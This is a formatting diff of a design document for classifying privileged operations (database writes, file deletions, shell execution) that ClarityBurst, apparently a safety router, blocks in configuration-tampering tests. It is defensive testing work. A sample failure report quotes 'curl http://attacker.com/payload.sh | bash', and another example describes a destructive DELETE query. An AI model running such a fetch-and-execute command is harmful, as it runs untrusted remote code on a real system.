@@ -17,7 +17,7 @@
 }
 ```
 
-**Problem:** We know a count, but not *what type* of operations.
+**Problem:** We know a count, but not _what type_ of operations.
 
 ---
 
@@ -27,7 +27,7 @@
 {
   "caseId": "CONFIG_001",
   "privilegedOpsExecuted": 0,
-  
+
   "privilegedOpsClassification": {
     "WRITE_DB": { "blocked": 5, "executed": 0 },
     "DELETE_FILE": { "blocked": 2, "executed": 0 },
@@ -47,6 +47,7 @@
 ### Definition
 
 A **privileged operation** is any action that:
+
 - Modifies state (not just reads)
 - Affects security boundaries
 - Could cause data loss, integrity issues, or escalation
@@ -95,28 +96,28 @@ A **privileged operation** is any action that:
 ### TypeScript Interface (Future)
 
 ```typescript
-type PrivilegedOpType = 
-  | "WRITE_DB" 
-  | "DELETE_FILE" 
-  | "EXEC_SHELL" 
-  | "NETWORK_MUTATION" 
+type PrivilegedOpType =
+  | "WRITE_DB"
+  | "DELETE_FILE"
+  | "EXEC_SHELL"
+  | "NETWORK_MUTATION"
   | "CONFIG_CHANGE";
 
 interface PrivilegedOpRecord {
   type: PrivilegedOpType;
-  description: string;              // "DELETE FROM users WHERE id=1"
-  routerIntent: string;             // What the router was trying to do
-  blocked: boolean;                 // true = router/fail-closed stopped it
-  blockReason: string;              // "contract_denied" | "fail_closed" | "startup_error"
-  executedAttempt: boolean;         // true = operation did execute (CRITICAL)
-  timestamp: number;                // When it occurred
+  description: string; // "DELETE FROM users WHERE id=1"
+  routerIntent: string; // What the router was trying to do
+  blocked: boolean; // true = router/fail-closed stopped it
+  blockReason: string; // "contract_denied" | "fail_closed" | "startup_error"
+  executedAttempt: boolean; // true = operation did execute (CRITICAL)
+  timestamp: number; // When it occurred
 }
 
 interface PrivilegedOpsClassification {
   WRITE_DB: {
-    blocked: number;                // How many were blocked
-    executed: number;               // How many executed (CRITICAL)
-    records: PrivilegedOpRecord[];  // Detail
+    blocked: number; // How many were blocked
+    executed: number; // How many executed (CRITICAL)
+    records: PrivilegedOpRecord[]; // Detail
   };
   DELETE_FILE: {
     blocked: number;
@@ -142,9 +143,10 @@ interface PrivilegedOpsClassification {
 
 interface ConfigurationInjectionTestCase {
   // ... existing fields ...
-  
-  privilegedOpsExecuted: number;           // Current: total count
-  privilegedOpsClassification?: {          // Future: breakdown by type
+
+  privilegedOpsExecuted: number; // Current: total count
+  privilegedOpsClassification?: {
+    // Future: breakdown by type
     WRITE_DB: { blocked: number; executed: number };
     DELETE_FILE: { blocked: number; executed: number };
     EXEC_SHELL: { blocked: number; executed: number };
@@ -214,7 +216,7 @@ Attack Attempt Timeline:
 Summary:
   WRITE_DB attempts: 3 blocked, 0 executed
   CONFIG_CHANGE attempts: 1 blocked, 0 executed
-  
+
 Result: ✅ PASS (All privileged ops blocked)
 ```
 
@@ -254,21 +256,25 @@ Per Test Case:
 ## Implementation Roadmap
 
 ### Phase 1 (Current): Count Only
+
 - ✅ Track `privilegedOpsExecuted: number`
 - ✅ Binary gate: 0 = PASS, >0 = FAIL
 - ✅ Backward compatible
 
 ### Phase 2 (Next): Classification Added
+
 - 🔜 Add `privilegedOpsClassification` interface
 - 🔜 Track by type: WRITE_DB, DELETE_FILE, etc.
 - 🔜 Maintain backward compatibility (optional field)
 
 ### Phase 3 (Future): Detailed Records
+
 - 🔜 Record each operation attempt
 - 🔜 Track block reason (contract_denied, fail_closed, etc.)
 - 🔜 Enable audit trail generation
 
 ### Phase 4 (Future): Advanced Analytics
+
 - 🔜 Attack pattern detection
 - 🔜 Risk scoring by operation type
 - 🔜 Threat landscape visualization
@@ -354,6 +360,7 @@ jq '.configTests[] | .privilegedOpsClassification.WRITE_DB' artifact.json
 ```
 
 Output:
+
 ```json
 {
   "blocked": 23,
@@ -387,6 +394,7 @@ jq '[.configTests[] | .privilegedOpsClassification] | map({
 ```
 
 Output:
+
 ```json
 {
   "write_db": 23,
@@ -404,7 +412,7 @@ Output:
 ### Keep Current Field
 
 ```typescript
-privilegedOpsExecuted: number;  // Still required, still the gate
+privilegedOpsExecuted: number; // Still required, still the gate
 ```
 
 ### Add Classification as Optional
@@ -446,14 +454,14 @@ All privileged operations were blocked during config tampering scenarios.
 
 ## Privileged Operations Breakdown
 
-| Operation Type | Attempted | Blocked | Executed | Risk |
-|---|---|---|---|---|
-| Database Writes | 23 | 23 | 0 | ✅ LOW |
-| File Deletions | 8 | 8 | 0 | ✅ LOW |
-| Shell Execution | 5 | 5 | 0 | ✅ LOW |
-| Network Mutations | 3 | 3 | 0 | ✅ LOW |
-| Config Changes | 11 | 11 | 0 | ✅ LOW |
-| **TOTAL** | **50** | **50** | **0** | **✅ SAFE** |
+| Operation Type    | Attempted | Blocked | Executed | Risk        |
+| ----------------- | --------- | ------- | -------- | ----------- |
+| Database Writes   | 23        | 23      | 0        | ✅ LOW      |
+| File Deletions    | 8         | 8       | 0        | ✅ LOW      |
+| Shell Execution   | 5         | 5       | 0        | ✅ LOW      |
+| Network Mutations | 3         | 3       | 0        | ✅ LOW      |
+| Config Changes    | 11        | 11      | 0        | ✅ LOW      |
+| **TOTAL**         | **50**    | **50**  | **0**    | **✅ SAFE** |
 
 ## Per-Test Breakdown
 
@@ -462,6 +470,7 @@ All privileged operations were blocked during config tampering scenarios.
 **Attack Goal:** Execute privileged operations despite disabled contracts
 
 **Privileged Ops Attempted:**
+
 - WRITE_DB: 3 blocked, 0 executed
 - CONFIG_CHANGE: 2 blocked, 0 executed
 
@@ -472,6 +481,7 @@ All privileged operations were blocked during config tampering scenarios.
 **Attack Goal:** Execute operations by disabling fail-closed
 
 **Privileged Ops Attempted:**
+
 - WRITE_DB: 3 blocked, 0 executed
 - EXEC_SHELL: 1 blocked, 0 executed
 
@@ -493,11 +503,11 @@ ClarityBurst successfully blocked **50 privileged operation attempts** across 7 
 ### Step 1: Define Types
 
 ```typescript
-type PrivilegedOpType = 
-  | "WRITE_DB" 
-  | "DELETE_FILE" 
-  | "EXEC_SHELL" 
-  | "NETWORK_MUTATION" 
+type PrivilegedOpType =
+  | "WRITE_DB"
+  | "DELETE_FILE"
+  | "EXEC_SHELL"
+  | "NETWORK_MUTATION"
   | "CONFIG_CHANGE";
 ```
 
@@ -553,8 +563,9 @@ const noPrivilegedExecution = (t.privilegedOpsExecuted ?? 0) === 0;
 
 // Add classification detail (future)
 if (t.privilegedOpsClassification) {
-  const allBlocked = Object.values(t.privilegedOpsClassification)
-    .every(ops => ops.executed === 0);
+  const allBlocked = Object.values(t.privilegedOpsClassification).every(
+    (ops) => ops.executed === 0,
+  );
   console.log(`  WRITE_DB: ${ops.blocked} blocked, ${ops.executed} executed`);
   // etc...
 }
@@ -565,25 +576,30 @@ if (t.privilegedOpsClassification) {
 ## Benefits of This Design
 
 ### 1. **Progressive Enhancement**
+
 - Phase 1: Simple count (current)
 - Phase 2+: Detailed classification (future)
 - No breaking changes
 
 ### 2. **Rich Reporting**
+
 - From: "0 privileged ops executed" ✅
 - To: "WRITE_DB: 23 blocked, 0 executed; DELETE_FILE: 8 blocked, 0 executed; ..." ✅✅
 
 ### 3. **Attack Pattern Analysis**
+
 - Which operation types are most frequently attempted?
 - Which are easiest to block?
 - Which require special hardening?
 
 ### 4. **Audit Trail**
+
 - Detailed records of each operation
 - Block reason (contract_denied vs fail_closed vs startup_error)
 - Timestamp and context
 
 ### 5. **Risk Scoring**
+
 - Different operations have different risk levels
 - Database writes less critical than shell execution
 - Report highlights true threats
@@ -610,7 +626,7 @@ if (t.privilegedOpsClassification) {
     },
     "EXEC_SHELL": {
       "blocked": 0,
-      "executed": 1      // ⚠️ CRITICAL: Shell execution succeeded!
+      "executed": 1 // ⚠️ CRITICAL: Shell execution succeeded!
     },
     "NETWORK_MUTATION": {
       "blocked": 1,
@@ -625,6 +641,7 @@ if (t.privilegedOpsClassification) {
 ```
 
 **Report:**
+
 ```
 CONFIG_005 TEST FAILED ❌
 
@@ -633,7 +650,7 @@ Configuration tampering allowed shell execution!
 EXEC_SHELL: 0 blocked, 1 executed
   Command: "curl http://attacker.com/payload.sh | bash"
   Block Reason: None (execution succeeded)
-  
+
 SEVERITY: CRITICAL
 ACTION: Investigate why fail-closed didn't trigger
 ```
@@ -669,7 +686,7 @@ ACTION: Investigate why fail-closed didn't trigger
 **This Design Document:** ✅ Complete  
 **Phase 1 Implementation:** ✅ Done (count only)  
 **Phase 2+ Implementation:** 🔜 Ready to implement  
-**Backward Compatibility:** ✅ Built-in  
+**Backward Compatibility:** ✅ Built-in
 
 ---
 
